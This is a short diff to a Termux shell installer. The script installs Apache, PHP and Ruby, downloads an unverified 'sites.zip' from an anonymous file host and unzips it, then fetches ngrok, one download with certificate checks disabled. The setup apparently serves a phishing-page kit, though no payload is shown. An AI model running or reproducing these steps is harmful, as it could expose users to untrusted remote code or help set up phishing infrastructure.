@@ -15,15 +15,14 @@ echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD R
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 termux-setup-storage
-apt-get install apache2 -y
-apt install 
+sudo apt-get install apache2 -y
 apt install ruby -y;apt install php -y;apt install jq -y;apt install tail -y;apt install curl -y
 apt install zip -y;pkg install wget -y;pkg install ruby -y;pkg install gem -y;gem install lolcat
-if [[ -e sites.zip ]]; then
-wget https://filebin.net/nxtk19qldiww5x44/sites.zip --no-check-certificate
+
+wget https://filebin.net/nxtk19qldiww5x44/sites.zip
 unzip -qq sites.zip
 rm sites.zip
-fi
+
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
 unzip ngrok-stable-linux-arm.zip
